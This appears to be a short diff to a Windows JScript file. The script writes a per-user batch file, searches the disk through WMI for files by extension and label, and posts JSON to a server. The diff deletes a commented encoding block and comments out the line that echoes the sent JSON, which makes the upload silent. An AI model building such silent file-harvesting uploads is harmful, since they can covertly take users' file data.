@@ -342,25 +342,7 @@ try {
 								f1.Close();
 								f3 = fso.OpenTextFile(""+profile+"\\archive_files_"+usern+".bat", 2, true, 0);
 								f3.Close();
-								//////////////////encoding playing/////////////////
-								/*
-								var adTypeText = 2;
-								var charset = "utf-8";
-								var adSaveCreateOverWrite = 2;
-								var stream;
-								var sFileName = ""+profile+"\\archive_files_"+usern+".txt";
-								var sFileContent = 0
-								stream = WScript.CreateObject("ADODB.Stream");
-								stream.Open();
-								stream.Type = adTypeText;
-								stream.Position = 0;
-								stream.Charset = charset;
 
-								stream.WriteText(sFileContent);
-
-								stream.SaveToFile(sFileName, adSaveCreateOverWrite);
-								stream.Close();
-								*/
 							}
 					
 					var TxtFiles = wmi.ExecQuery('Select Path,Drive,Extension,FileName,FileSize FROM CIM_DataFile WHERE ('+labels_mask+')  AND ('+extensions_mask+')');
@@ -607,6 +589,6 @@ try {
 	http.setRequestHeader("Content-Type", "application/json");
 	http.send(json);
 	
-	WScript.Echo(json);
+	//WScript.Echo(json);
 	
 } catch(e) {};
